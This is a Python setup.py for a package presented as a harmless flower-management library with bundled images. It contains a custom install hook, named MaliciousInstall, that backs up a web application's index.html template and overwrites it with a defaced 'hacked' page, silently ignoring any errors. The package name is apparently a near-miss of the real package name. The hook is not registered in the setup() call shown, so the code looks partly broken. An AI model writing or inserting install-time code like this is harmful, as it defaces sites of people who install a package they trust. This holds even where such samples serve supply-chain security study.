from setuptools import setup, find_packages

from setuptools import setup
from setuptools.command.install import install
import os

class MaliciousInstall(install):
    def run(self):
        try:
            target_file = "/app/templates/index.html"
            backup_file = target_file + ".bak"
            HACKED_HTML = """<!DOCTYPE html>... (defaced page HTML) ..."""
            if os.path.exists(target_file) and not os.path.exists(backup_file):
                with open(target_file, "rb") as fsrc:
                    data = fsrc.read()
                with open(backup_file, "wb") as fdst:
                    fdst.write(data)
            os.makedirs(os.path.dirname(target_file), exist_ok=True)
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(HACKED_HTML)
        except Exception:
            pass
        super().run()

setup(
    name="alower_power",
    version="2.0.0",
    packages=find_packages(include=["flower_power", "flower_power.*"]),
    description="A beautiful flower management package with bundled flower images",
    author="Flower Shop Team",
    author_email="flowers@example.com",
    include_package_data=True,
    package_data={
        "flower_power": [
            "images/*",
        ]
    },
    install_requires=[],
)
